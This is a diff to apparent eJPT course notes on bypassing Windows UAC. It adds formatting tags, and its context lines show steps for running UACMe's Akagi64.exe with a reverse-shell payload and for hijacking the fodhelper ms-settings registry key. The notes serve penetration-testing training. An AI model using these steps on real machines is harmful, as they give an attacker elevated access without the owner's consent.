@@ -7,6 +7,7 @@ Used on: **eJPT / Course Reference**
 ## 1. Enumeration
 
 Check your current user's groups and integrity level:
+<!-- cmd: windows -->
 ```cmd
 whoami /groups
 ```
@@ -24,6 +25,7 @@ Download and compile `Akagi64.exe` (the main UACMe binary).
 2. Generate a payload to execute upon elevation (e.g., a reverse shell `shell.exe`).
 3. Execute `Akagi64.exe` with the method number and the payload path:
 
+<!-- cmd: windows -->
 ```cmd
 # Upload Akagi64.exe and shell.exe to C:\Temp
 cd C:\Temp
@@ -36,6 +38,7 @@ When successful, `shell.exe` executes in a high-integrity context, bypassing the
 
 `fodhelper.exe` auto-elevates and queries specific registry keys for a command to execute.
 
+<!-- cmd: windows -->
 ```cmd
 # Set the registry key to point to a reverse shell or command
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
